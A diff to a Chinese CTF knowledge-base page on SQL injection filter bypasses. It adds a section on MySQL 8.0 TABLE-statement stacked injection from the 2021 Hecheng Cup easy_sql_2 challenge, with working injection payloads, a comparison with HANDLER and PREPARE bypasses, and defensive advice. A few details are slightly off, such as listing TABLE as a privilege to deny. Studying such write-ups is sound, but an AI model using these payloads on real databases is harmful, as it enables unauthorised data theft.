@@ -1,8 +1,8 @@
 ---
 title: CTFshow & BUUCTF SQL注入绕过技术全谱：从基础到进阶利用链
 description: 系统整合 CTFshow WEB 入门关卡（第 1-7 关）基础绕过技术与 BUUCTF 实战题目中的进阶 SQL 注入利用链，涵盖 intval()
-  特性利用、正则过滤递进绕过、进制转换、位运算、堆叠注入、报错注入、XPath 注入、盲注、宽字节注入、二阶注入等核心技术，构建完整 PHP/MySQL Web
-  攻防知识体系。
+  特性利用、正则过滤递进绕过、进制转换、位运算、堆叠注入、报错注入、XPath 注入、盲注、宽字节注入、二阶注入等核心技术，新增 MySQL 8.0 TABLE
+  语句实现堆叠注入绕过 SELECT 过滤的技术细节，结合 2021 鹤城杯 easy_sql_2 题目实战演示版本特性利用思路。
 category: program-analysis
 tags:
 - CTF
@@ -23,13 +23,18 @@ tags:
 - Bitwise Operations
 - Union Injection
 - Filter Bypass
+- MySQL 8.0
+- TABLE Statement
+- Hecheng Cup
 date: '2024-01-15'
-updated: '2026-11-14'
+updated: '2026-11-15'
 ---
 
 ## 概述
 
 本页面系统整合 **CTFshow WEB 入门系列第 1-7 关** 的 SQL 注入基础绕过核心知识点，并补充 **BUUCTF Web 方向实战题目** 中的进阶利用链与绕过姿势。题目核心逻辑多为：通过 `GET/POST` 参数查询数据库，需满足特定条件（如 `intval($id) > 999`）并绕过层层递进的正则/WAF 过滤，最终构造 Payload 实现注入、读取文件、执行命令或获取 Flag。
+
+**新增内容**：深度解析 **MySQL 8.0 TABLE 语句** 在堆叠注入中绕过 `SELECT` 关键字过滤的原理与实战，结合 **2021 鹤城杯 easy_sql_2** 题目复现完整利用链。
 
 > **关联页面**：
 > - 后续 CTFshow 第 8-23 关涉及命令执行、文件包含、日志投毒等 RCE 技术，详见 [[ctf-show-php-command-execution-bypass-techniques]]。
@@ -38,6 +43,7 @@ updated: '2026-11-14'
 > - MongoDB NoSQL 注入四大手法，详见 [[mongodb-nosql-injection-guide]]。
 > - Java 参数化查询防御原理，详见 [[java-preparedstatement-sql-injection-defense]]。
 > - SSRF 绕过与利用链，详见 [[ssrf-bypass-techniques]]、[[ssrf-ctf-exploitation-guide]]。
+> - 2021 鹤城杯 Web+Misc 完整 Writeup，详见 [[hec-cup-2021-web-misc-writeup]]。
 
 ---
 
@@ -275,7 +281,56 @@ prepare sqla from @sql; execute sqla;#
 - `pipes_as_concat` 使 `||` 变为字符串拼接而非逻辑或
 - `select 1||flag` 等价于 `select concat(1, flag)`，构造可控列内容
 
-> **防御启示**：禁用多语句执行（`mysqli::multi_query=false`）、最小权限账号（禁止 `alter`/`rename`/`handler`）、WAF 拦截分号与 DDL 关键字。
+#### **新增：MySQL 8.0 TABLE 语句绕过 SELECT 过滤（2021 鹤城杯 easy_sql_2 实战）**
+
+**技术背景**：
+- MySQL 8.0.19 引入 `TABLE` 语句，语法：`TABLE table_name` 等价于 `SELECT * FROM table_name`
+- 支持 `ORDER BY`、`LIMIT`、`WHERE`（8.0.20+）等子句
+- **关键特性**：`TABLE` 语句**不包含 `SELECT` 关键字**，可绕过基于关键字的 WAF/正则过滤
+
+**鹤城杯 easy_sql_2 题目环境**：
+- 过滤规则：拦截 `select`、`union`、`or` 等核心关键字
+- 数据库版本：MySQL 8.0（支持 `TABLE` 语句）
+- 注入点：支持堆叠查询（多语句执行）
+- 目标：读取 Flag 表数据
+
+**利用链构造**：
+
+```sql
+-- 步骤 1：探测表名（假设已知或通过 information_schema 泄露）
+-- 步骤 2：使用 TABLE 语句直接读取表内容，配合堆叠注入
+'; TABLE `flag_table`; #
+```
+
+**完整 Payload 示例**：
+```sql
+'; TABLE `1919810931114514`; #
+```
+- `;` 闭合前置查询，开启堆叠注入
+- `TABLE \`1919810931114514\`` 直接输出表所有行列（等价 `SELECT * FROM ...`）
+- `#` 注释掉后续 SQL
+
+**进阶变体（带排序限制）**：
+```sql
+'; TABLE `flag_table` ORDER BY `id` LIMIT 1; #
+```
+- 支持 `ORDER BY`、`LIMIT` 子句，精确控制输出
+
+**对比优势**：
+
+| 绕过方式 | Payload 示例 | 适用条件 | 局限性 |
+|----------|--------------|----------|--------|
+| `HANDLER` | `handler \`t\` open as a; handler a read next;` | 所有版本 | 语法较繁琐，需两条语句 |
+| `PREPARE` | `set @s=concat(char(...)); prepare x from @s; execute x;` | 所有版本 | 依赖 `prepare`/`execute` 权限 |
+| **`TABLE` (MySQL 8.0.19+)** | `TABLE \`t\`;` | **MySQL 8.0.19+** | **语法最简洁，单语句完成，直观** |
+
+**实战复现流程（鹤城杯 easy_sql_2）**：
+1. **版本确认**：通过 `SELECT VERSION()` 或报错注入确认 MySQL 8.0+
+2. **表名枚举**：利用报错注入或 `information_schema` 获取目标表名（如 `1919810931114514`）
+3. **构造堆叠注入**：`?id=1; TABLE \`1919810931114514\`; #`
+4. **获取 Flag**：页面直接回显表内容，包含 Flag 字段
+
+> **防御启示**：禁用多语句执行（`mysqli::multi_query=false`）、最小权限账号（禁止 `alter`/`rename`/`handler`/`TABLE`）、WAF 拦截分号与 DDL/DML 关键字、升级 MySQL 版本时评估新语法带来的攻击面。
 
 ---
 
@@ -492,6 +547,11 @@ $payload = serialize($obj); // O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
    - 数据库/表/连接字符集为 GBK/Big5 等多字节编码
    - PHP `addslashes`/`mysqli_real_escape_string` 未设置正确字符集
 
+9. **MySQL 版本特性利用（新增）**
+   - **MySQL 8.0.19+**：`TABLE` 语句绕过 `SELECT` 过滤
+   - **MySQL 8.0.20+**：`TABLE` 支持 `WHERE` 子句，功能更完整
+   - 实战中**首选版本特性**，语法简洁、可读性强、绕过效果佳
+
 ---
 
 ## 知识图谱关联
@@ -507,6 +567,7 @@ $payload = serialize($obj); // O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
 | **XXE 基础** | [[xxe-xml-dtd-fundamentals]] | XML/DTD/实体引用/外部实体任意文件读取原理 |
 | **PHP 反序列化** | [[php伪协议与反序列化利用]] | `php://filter`、`phar://`、魔术方法、`__wakeup` 绕过、对象逃逸 |
 | **PHP Webshell** | [[php-webshell-fundamentals-chopper-analysis]]、`[[php-webshell-obfuscation-av-evasion]]` | `eval()` 执行原理、蚁剑流量分析、C++ 多态混淆免杀 |
+| **鹤城杯 2021 完整 Writeup** | [[hec-cup-2021-web-misc-writeup]] | PHP 黑魔法、流量取证盲注、MySQL 8.0 TABLE 注入、SSRF Gopher 攻击 MySQL、Spring Web Flow CVE-2017-4971 RCE |
 
 ---
 
@@ -546,6 +607,10 @@ $payload = serialize($obj); // O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
 
 # 堆叠注入 - Prepared Statement 绕过引号
 '; set @tn=0x31393139383130393331313134353134; set @sql=concat(char(115,101,108,101,99,116)," * from `",@tn,"`"); prepare sqla from @sql; execute sqla;#
+
+# 堆叠注入 - MySQL 8.0 TABLE 语句（新增，鹤城杯 easy_sql_2 实战）
+'; TABLE `1919810931114514`; #
+'; TABLE `flag_table` ORDER BY `id` LIMIT 1; #
 
 # 报错注入 - updatexml 爆库/表/列/数据
 ' or updatexml(1, concat(0x7e, (select database()), 0x7e), 1) --+
@@ -591,8 +656,8 @@ password=1234567c
 
 ---
 
-*页面维护：数字知识库策展人 | 最后更新：2024-01-15 | 来源：0w1Club 微信归档《CTFshow 萌新题》+ BUUCTF Web 实战归档《BUUCTF -web安全部分 刷题分享》*
+*页面维护：数字知识库策展人 | 最后更新：2026-11-14 | 来源：0w1Club 微信归档《CTFshow 萌新题》+ BUUCTF Web 实战归档《BUUCTF -web安全部分 刷题分享》+ 2021 鹤城杯 Web+Misc Writeup 微信归档*
 
 ## 来源
 
-- [0x00实验室-202108-202304_080](../sources/0x00实验室-202108-202304_080.md)
+- [0xfafu攻防实验室-202010-202112_09](../sources/0xfafu攻防实验室-202010-202112_09.md)
